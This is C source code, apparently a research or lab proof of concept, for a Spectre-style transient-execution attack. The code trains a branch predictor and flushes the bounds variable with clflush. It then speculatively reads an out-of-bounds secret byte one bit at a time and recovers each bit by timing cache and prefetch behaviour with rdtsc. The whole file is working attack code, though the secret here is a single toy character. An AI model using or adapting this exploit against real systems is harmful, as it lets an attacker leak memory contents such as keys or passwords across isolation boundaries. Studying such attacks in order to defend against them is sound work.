#include <stdio.h>
#include <stdint.h> 
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h>
#else
#include <x86intrin.h>
#endif



#define TRAIN_TIMES         9    // the predictor in SonicBoom is much more sophisticated, need more training
#define ROUNDS              10    // run the train + attack sequence X amount of times (for redundancy)
#define ATTACK_SAME_ROUNDS  1   // amount of times to attack the same index
#define SECRET_SZ           1
#define CACHE_HIT_THRESHOLD 80
#define L1_BLOCK_SZ_BYTES   64

uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];//16384 = 256*L1_BLOCK_SZ_BYTES
uint8_t dummy;
char* secretString = "*";
//* 0010 1010
//s 0b0111 0011
//e 0110 0101
//c 0110 0011
//R 0101 0010
//E 0100 0101
//t 0111 0100
//~ 0111 1110

__attribute__((always_inline)) static inline uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}
void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
void mfence() { asm volatile("mfence"); }

int access_time(void *ptr) {
	uint64_t start = 0, end = 0;

	start = rdtsc();
	maccess(ptr);
	end = rdtsc();

	mfence();

	flush(ptr);

	return (int)(end - start);
}

void victimFunc(uint64_t idx, uint8_t shift){
    if (idx < array1_sz) {//推测执行窗口。
        if((array1[idx] >> shift) & 0x1){ //1-训练  0-不训练
           //nothing.
        }else{
            maccess(&dummy); // 不会触发预取
        }
    }
}

void randomAccess(){
    maccess(array2 + 12*64);
    maccess(array1);
    maccess(array2 + 73*64);
    maccess(array2 + 45*64);
    maccess(array2 + 31*64);
    maccess(array2 + 157*64);
    maccess(array2 + 205*64);
    maccess(array2 + 88*64);
}

int main(void) {
    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
    uint64_t start, diff, passInIdx, randIdx, latency;
    uint8_t dummy = 0, mix_i = 0;;
    static uint64_t results[8] = {0};
    printf("the secret key is:'*' 0010 1010 \n", secretString);
    // printf("");
    // printf("bit %d\n",bit);
    for(uint64_t len = 0; len < SECRET_SZ; ++len) {
        for(int bit = 7; bit >= 0; bit--){
            for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {
                randomAccess();
                for (int tt =0; tt <256; tt++){
                    _mm_clflush(&array2[tt * L1_BLOCK_SZ_BYTES]);
                }
                for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
                    randIdx = atkRound % array1_sz;
                    passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                    passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                    passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx   
                    if(j == 0){//attack round
                        maccess(array2 + 64); //33d68  1*64
                        maccess(array2 + 192);//33de8 3*64
                        maccess(array2 + 320);// 5*64
                        // maccess(array2 + 448);// 5*64
                    }
                    for(uint64_t k = 0; k < 50; ++k) asm(""); // set of constant takens to make the BHR be in a all taken state
                    _mm_clflush(&array1_sz);
                    victimFunc(passInIdx,bit); // 1 * L1_BLOCK_SZ_BYTES
                }
            } 
            // maccess(array2); // 不会触发预取
            maccess(array2 + 448); // 不会触发预取
            for(uint8_t k = 0; k < 30; ++k) asm("");
            results[bit] =  access_time(array2 + 576);
        }
        ++attackIdx; // read in the next secret 
    }

    // latency = access_time(array2 + 99*64);
    // printf("Miss latency = %d\n",latency);
   
    // printf("latency\tbit\n");
    for(int i=7;i>=0;i--){
        printf("%d\t%s\n",results[i], results[i] < CACHE_HIT_THRESHOLD ? "prefetch\t1" : "no prefetch\t0");
    }
    printf("\n");
    return 0;
}
